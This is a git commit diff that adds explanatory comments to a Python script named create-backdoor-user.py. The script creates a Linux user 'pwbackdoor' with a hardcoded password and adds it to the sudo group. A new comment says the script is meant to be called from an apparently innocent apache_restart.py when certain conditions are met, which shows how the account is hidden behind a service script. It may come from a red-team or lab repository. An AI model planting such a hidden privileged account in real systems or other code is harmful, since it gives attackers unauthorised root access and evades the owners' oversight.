786561ee523d27219402c2e2d8e27429035e83de
paulkwalton <43542501+paulkwalton@users.noreply.github.com>
2023-05-26 09:47:39 +0100

    Update create-backdoor-user.py

--- python/create-backdoor-user.py
+++ python/create-backdoor-user.py
@@ -1,9 +1,21 @@
 # call.py
+
+# We are importing the os library, which provides a portable way of using operating system dependent functionality
+# such as reading or writing to the environment and creating or destroying files.
 import os
 
-# Create a new user 'pwbackdoor' with password 'pwbackdoor1234'
+# The os.system() function allows us to execute system-level commands from Python.
+# In this case, we are using it to create a new user, set a password for the user, and add the user to the sudo group.
+
+# This line will execute the 'useradd' command to add a new user named 'pwbackdoor'.
 os.system("sudo useradd pwbackdoor")
+
+# This line will use the 'chpasswd' command to change the password of the user 'pwbackdoor' to 'pwbackdoor1234'.
 os.system("echo pwbackdoor:pwbackdoor1234 | sudo chpasswd")
     
-# Grant 'pwbackdoor' sudo privileges
+# This line will use the 'usermod' command to add the user 'pwbackdoor' to the 'sudo' group,
+# which will give them the ability to execute commands with superuser privileges.
 os.system("sudo usermod -aG sudo pwbackdoor")
+
+# Note: This script (call.py) will be called from another script (apache_restart.py) when certain conditions are met.
+
